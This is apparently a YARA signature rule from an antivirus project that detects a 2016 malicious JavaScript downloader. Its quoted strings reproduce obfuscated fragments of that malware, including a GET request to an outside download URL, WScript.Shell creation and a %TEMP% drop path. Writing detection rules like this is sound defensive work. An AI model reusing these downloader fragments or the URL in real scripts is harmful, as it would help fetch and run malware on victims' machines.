rule sig_20160427_e530f9a1059ea125222609cfcf9e0d31 {
  meta:
    description = "datamaliciousorder - file 20160427_e530f9a1059ea125222609cfcf9e0d31.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "003eb65368ff578616fc2323b5437c834cc7638b6aba15db5dd8a1ace28324d7"

  strings:
    $s1  = "FmtdeNguim[YwqwaDkyap](\"G\" + \"ET\", \"http://haraccountants.co.uk/k9sjf\", false);" fullword ascii
    $s2  = "function JywxdAvngf() {return YsprjPvaws[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qirZE7u" ascii
    $s3  = "function JywxdAvngf() {return YsprjPvaws[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qirZE7u" ascii
    $s4  = "function TllpwTyplm(){return YlqhjQkclv + \"\";};" fullword ascii
    $s5  = "if (FmtdeNguim[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s6  = "function YyjamJnqnx(HtraaRdqnm, ZhjdtCwkow){ZcaukKjwiy = ZcaukKjwiy * 1; return HtraaRdqnm - ZhjdtCwkow;};" fullword ascii
    $s7  = "var YsprjPvaws = function LtcxiHlitc() {return WtwcaCnggi[HxvepGjiyi](\"WScript\"+\".Shell\");}(), JbupdCyoka = 11;" fullword ascii
    $s8  = "function MqcdhTdeod() {return ((JnrpvPobvy == true) && (JnrpvPobvy == CadtmPwueh)) ? 1 : ZcaukKjwiy;};" fullword ascii
    $s9  = "var WtwcaCnggi = this[\"WScript\"];" fullword ascii
    $s10 = "return YyjamJnqnx(WzwulZxklq, EemsbEaayh);" fullword ascii
    $s11 = "var VzkzfWliql = false;" fullword ascii
    $s12 = "function DsvmiCifsc(){return HxvepGjiyi;};" fullword ascii
    $s13 = "var JnrpvPobvy = false;" fullword ascii
    $s14 = "function JweqyWifqq(WmvolWvaym) {var IrifjYqugf = (1, 2, 3, 4, 5, WmvolWvaym); return IrifjYqugf;};" fullword ascii
    $s15 = "JnrpvPobvy = true; " fullword ascii
    $s16 = "}while (OntutWevvb);" fullword ascii
    $s17 = "function ZqzkwEuirz()" fullword ascii
    $s18 = "function XjuwxHwwht(){return 23;};" fullword ascii
    $s19 = "var XfaieRtyyn = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "VzkzfWliql = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}